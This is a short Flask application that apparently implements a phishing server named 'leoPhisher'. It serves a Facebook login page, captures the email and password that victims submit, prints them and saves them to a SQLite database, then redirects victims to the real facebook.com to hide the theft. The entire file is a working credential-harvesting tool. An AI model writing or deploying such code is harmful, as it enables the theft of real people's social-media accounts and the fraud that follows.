from flask import Flask,render_template,request,redirect
from flask_sqlalchemy import SQLAlchemy
from Models.db import db
from Models.model import LoginCredentials
app=Flask(__name__)



app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///leoPhisher.db'
db.init_app(app)

with app.app_context():
    db.create_all()


@app.route("/")
def home():
    return render_template("facebook/index.html")



@app.route("/login",methods=['POST'])
def page_login():
    form =request.form
    username=form.get('email')
    password=form.get('password')
    print(username +" "+ password)
    data=LoginCredentials(username=username,password=password)
    db.session.add(data)
    db.session.commit()

    response=redirect("https://www.facebook.com/",code=303)
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'

    return response

if __name__=="__main__":
    app.run(debug=True)
    

